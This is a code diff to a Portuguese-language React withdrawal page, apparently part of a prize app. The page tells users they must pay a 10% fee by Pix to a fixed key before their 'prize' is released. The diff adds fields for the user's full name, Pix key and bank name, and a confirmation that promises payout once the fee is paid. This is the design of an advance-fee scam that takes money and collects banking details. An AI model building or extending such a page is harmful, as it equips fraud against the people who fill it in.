@@ -1,14 +1,32 @@
-import React from "react";
-import { useLocation } from "react-router-dom";
+import React, { useState } from "react";
+import { useLocation, useNavigate } from "react-router-dom";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
-import { CheckCircle, Pix } from "lucide-react"; // Assuming Pix icon exists or using a generic one
+import { CheckCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { toast } from "sonner";
 
 const Withdrawal = () => {
   const location = useLocation();
+  const navigate = useNavigate();
   const totalPrize = (location.state as { totalPrize: number })?.totalPrize || 0;
   const withdrawalFee = totalPrize * 0.10; // 10% of the total prize
-  const pixKey = "11.111.111/0001-11"; // Placeholder Pix key
+  const pixKeyForPayment = "11.111.111/0001-11"; // Placeholder Pix key for payment
+
+  const [fullName, setFullName] = useState("");
+  const [bankPixKey, setBankPixKey] = useState("");
+  const [bankName, setBankName] = useState("");
+
+  const handleConfirmWithdrawal = () => {
+    if (!fullName || !bankPixKey || !bankName) {
+      toast.error("Por favor, preencha todos os campos para o saque.");
+      return;
+    }
+    // Aqui você poderia adicionar a lógica para processar o saque
+    // Por enquanto, apenas navegaremos de volta para o início
+    toast.success("Informações de saque enviadas! Seu prêmio será processado após o pagamento da taxa.");
+    navigate("/");
+  };
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-teal-500 to-cyan-600 text-white p-4">
@@ -49,10 +67,40 @@ const Withdrawal = () => {
               Para receber seu prêmio, pague a taxa via Pix:
             </p>
             <p className="text-lg font-bold text-center text-purple-700 break-all">
-              Chave Pix: {pixKey}
+              Chave Pix: {pixKeyForPayment}
             </p>
             <p className="text-sm text-gray-600 text-center mt-2">
               (Copie e cole no seu aplicativo bancário)
+            </p>
+          </div>
+
+          <div className="space-y-4 mb-6">
+            <p className="text-center text-md text-gray-800 font-semibold">
+              Preencha seus dados para receber o Pix:
+            </p>
+            <Input
+              type="text"
+              placeholder="Nome Completo"
+              value={fullName}
+              onChange={(e) => setFullName(e.target.value)}
+              className="text-center text-lg py-6"
+            />
+            <Input
+              type="text"
+              placeholder="Sua Chave Pix Bancária"
+              value={bankPixKey}
+              onChange={(e) => setBankPixKey(e.target.value)}
+              className="text-center text-lg py-6"
+            />
+            <Input
+              type="text"
+              placeholder="Nome do Seu Banco"
+              value={bankName}
+              onChange={(e) => setBankName(e.target.value)}
+              className="text-center text-lg py-6"
+            />
+            <p className="text-center text-sm text-gray-600">
+              As informações são necessárias para que o Pix seja efetuado na sua conta correta.
             </p>
           </div>
 
@@ -60,10 +108,10 @@ const Withdrawal = () => {
             Após a confirmação do pagamento da taxa, seu prêmio será enviado via Pix em até 30 minutos.
           </p>
           <Button
-            onClick={() => navigate("/")}
+            onClick={handleConfirmWithdrawal}
             className="w-full mt-8 bg-blue-600 hover:bg-blue-700 text-white text-lg py-3 rounded-md shadow-md transition-all duration-300 transform hover:scale-105"
           >
-            Voltar ao Início
+            Confirmar Saque e Voltar ao Início
           </Button>
         </CardContent>
       </Card>
